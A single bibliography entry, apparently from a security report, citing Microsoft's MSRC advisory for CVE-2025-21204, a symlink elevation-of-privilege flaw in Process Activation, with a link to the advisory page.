- [R-19] CVE-2025-21204 (Process Activation symlink EoP) — MSRC — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21204
